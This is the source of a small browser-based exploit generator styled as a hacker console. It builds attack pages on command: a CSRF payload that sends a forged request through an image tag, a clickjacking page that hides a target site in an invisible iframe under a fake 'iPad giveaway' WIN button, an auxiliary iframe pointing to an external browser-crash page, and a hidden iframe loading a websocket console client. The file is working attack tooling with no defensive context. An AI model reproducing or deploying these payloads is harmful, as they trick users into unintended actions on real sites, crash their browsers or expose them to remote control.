<html>
<body style="background: black;color: #00e700">
<h3 id="output"></h3>
<input id="inp" style="
    background: black;
    border: none;
    color: #00e700;
    outline: none;
    width:100%;
">
<script src="server.js"></script>

<script>
var fs = require('fs');
var stcd = '';
var vrs = [];
var htcode = '';
document.getElementById('output').innerHTML += 'You can currently select csrf and Clickjacking <br>You can select an Auxilary modules by typing aux {enter} and then using "set module" to set to BrowserDOS or BrowserConsole.<br>';
function wtofile(htmlcode) {
	fs.writeFile("exploit.html", htmlcode, function(err) {
    	if(err) {
        	return console.log(err);
    	}

    console.log("The file was saved!");
}); 
}
function interpreter(cmds) {

	if(cmds == 'clear') {
		document.getElementById('output').innerHTML = '';
	}
	if(cmds.split(' ')[0] == 'select') {
		if(cmds.split(' ')[1] == 'csrf') {
			document.getElementById('output').innerHTML += 'CSRF selected!<br>use "set url" to set the attack url and use "set params" to set url parameters!<br>';
			stcd = 'CSRF';
		}
		if(cmds.split(' ')[1] == 'Clickjacking') {
			document.getElementById('output').innerHTML += 'Clickjacking selected!<br>use "set top" to set the top position, use "set left" to set left position and use "set url" to set iframe url!<br>';
			stcd = 'Clickjacking';
		}
	} else if(cmds.split(' ')[0] == 'set') {
		vrs[cmds.split(' ')[1]] = cmds.split(' ')[2];
		document.getElementById('output').innerHTML += 'varible set<br>';
	} else if(cmds.split(' ')[0] == 'get') {
		document.getElementById('output').innerHTML += 'varible is:' + vrs[cmds.split(' ')[1]] + '<br>';
	} else if(cmds.split(' ')[0] == 'aux') {
		document.getElementById('output').innerHTML += 'Auxilary module selected! Use "set module" to set the module(duh...)!<br>';
		stcd = 'AUX';
	} else if(cmds.split(' ')[0] == 'exploit') {
		if(stcd == 'CSRF') {
			htcode = '<script>var x = new Image();x.src = "' + vrs['url']+'?'+vrs['params'] + '";'+"<\/script>";
			wtofile(htcode);
		}
		if(stcd == 'Clickjacking') {
			htcode = '<div style="position: absolute; left: 10px; top: 500px;">Hey - we are giving away iPad minis!!! Just click the WIN button and it is yours!!!</div> <div style="position: absolute;left: '+ vrs['left'] +';top: '+ vrs['top'] +';color: red;font-weight: bold;">&gt;&gt; WIN &lt;&lt;</div> <iframe style="opacity: 0;" height="100%" width="100% scrolling="no" src="'+ vrs['url']+'"></iframe>';
			wtofile(htcode);
		}
		if(stcd == 'AUX') {
			if(vrs['module'] == 'BrowserDOS') {
				htcode = '<iframe src="https://austinjacks.github.io/crashtests/smart-attack.html"></iframe>';
				wtofile(htcode);
			}
			if(vrs['module'] == 'BrowserConsole') {
				htcode = '<iframe src="wsclient.html" style="opacity: 0;"></iframe>';
				wtofile(htcode);
			}
		}
		document.getElementById('output').innerHTML += 'writing to file and starting server.<br>';
	} 
	else {
		document.getElementById('output').innerHTML += 'Not understood :(<br>';
	}
	document.getElementById('inp').value='';
}
document.getElementById('inp').onkeypress = function(e){
    if (!e) e = window.event;
    var keyCode = e.keyCode || e.which;
    if (keyCode == '13'){
      interpreter(document.getElementById('inp').value);
      return false;
    }
  }
</script>
</body>
</html>